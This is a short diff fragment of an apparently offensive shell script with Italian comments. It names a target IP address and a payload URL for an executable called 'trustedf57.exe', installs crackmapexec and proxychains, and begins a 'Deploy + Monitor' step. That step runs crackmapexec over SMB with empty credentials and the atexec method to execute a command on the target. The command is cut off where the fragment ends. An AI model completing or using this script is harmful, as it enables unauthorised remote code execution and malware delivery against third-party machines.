@@ -3,7 +3,7 @@ TARGET="186.57.237.126"
 EDGEONE_URL="https://YOUR_EDGEONE_URL/trustedf57.exe"
 
 # Installa dipendenze
-apt update -qq && apt install -y crackmapexec proxychains impacket-scripts python3 -qq
+apt update -qq && apt install -y crackmapexec proxychains  python3 -qq
 
 # Deploy + Monitor
 proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
